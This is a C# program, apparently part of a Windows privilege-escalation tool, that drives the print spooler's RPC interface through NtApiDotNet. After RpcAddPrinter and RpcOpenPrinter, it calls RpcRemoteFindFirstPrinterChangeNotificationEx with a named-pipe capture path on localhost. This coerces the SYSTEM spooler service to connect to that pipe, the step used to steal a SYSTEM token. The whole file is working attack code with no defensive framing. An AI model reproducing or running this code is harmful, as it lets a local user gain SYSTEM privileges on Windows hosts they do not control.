using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using rpc_12345678_1234_abcd_ef00_0123456789ab_1_0;
using NtApiDotNet.Ndr.Marshal;
using NtApiDotNet.Win32;
using NtApiDotNet;
using System.ServiceProcess;
using System.ComponentModel;

namespace RpcSpool
{
    class Program
    {
        static void StartAppinfoService()
        {
            try
            {
                ServiceController service = new ServiceController("appinfo");
                if (service.Status != ServiceControllerStatus.Running)
                {
                    service.Start();
                    service.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(5));
                }
            }
            catch
            {
            }
        }
        public static void RpcSpoolToSystem()
        {
            StartAppinfoService();

            using (Client client = new Client())
            {
                client.Connect();
                //create_flags |= CreateProcessFlags.UnicodeEnvironment;
                Struct_0 start_info = new Struct_0();
                String targetServerStr = "\\\\localhost\0";
                String captureServerStr = "\\\\localhost/pipe/xxx\0";
                NtApiDotNet.Ndr.Marshal.NdrContextHandle printerhandle = new NtApiDotNet.Ndr.Marshal.NdrContextHandle();
                
                Struct_8 a = new Struct_8();
                Struct_0 b = new Struct_0();
                Struct_18 c = new Struct_18();
                client.RpcAddPrinter(targetServerStr,a, b, c,out printerhandle);

                

                Console.WriteLine("printerhandle is:");
                Console.WriteLine(printerhandle);
                int hr_1 = client.RpcOpenPrinter(targetServerStr, out printerhandle, null, start_info, 0);
                
                Console.WriteLine("new printerhandle is:");
                Console.WriteLine(printerhandle);
                Console.WriteLine("RpcOpenPrinter return hr_1 code");
                Console.WriteLine(hr_1);
                int hr_2 = client.RpcRemoteFindFirstPrinterChangeNotificationEx(printerhandle,0x00000100,0,captureServerStr,0,null);
                Console.WriteLine("RpcRemoteFindFirstPrinterChangeNotificationEx return hr_2 code");
                //Console.WriteLine(hr_2);
                client.RpcClosePrinter(ref printerhandle);

                if (hr_2 != 0)
                {
                    throw new Win32Exception(hr_2);
                }
            }
        }
        static void Main(string[] args)
        {
            try
            {
                RpcSpoolToSystem();
            }
            catch(Exception ex) {
                Console.WriteLine(ex);
            }
            
        }
    }
}
